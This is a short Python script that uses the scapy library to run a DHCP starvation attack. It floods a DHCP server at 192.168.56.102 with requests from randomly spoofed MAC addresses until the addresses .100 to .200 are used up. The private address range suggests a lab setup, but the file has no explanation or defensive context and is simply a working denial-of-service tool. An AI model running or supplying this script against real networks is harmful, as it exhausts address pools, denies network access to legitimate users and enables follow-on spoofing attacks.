from scapy.all import *
import sys
import os

ip_addr_subnet = "192.168.56."

def attack_dhcp_server():
	for eachip in range(100,201):
		fake_mac_addr = RandMAC()
		ether = Ether(dst="ff:ff:ff:ff:ff:ff" ,src=fake_mac_addr, type=0x800)
		ip = IP(src = '0.0.0.0', dst = '192.168.56.255')
		udp = UDP(sport=68, dport=67)
		bootp = BOOTP(chaddr = fake_mac_addr)
		dhcp = DHCP(options=[("message-type","request"), ("server_id","192.168.56.102"), ("requested_addr", ip_addr_subnet + str(eachip)), "end"])
		dhcp_request_pkt = ether/ip/udp/bootp/dhcp 	
		#print dhcp_request_pkt
		sendp(dhcp_request_pkt)
		time.sleep(1)

if __name__=="__main__":
	
	attack_dhcp_server();
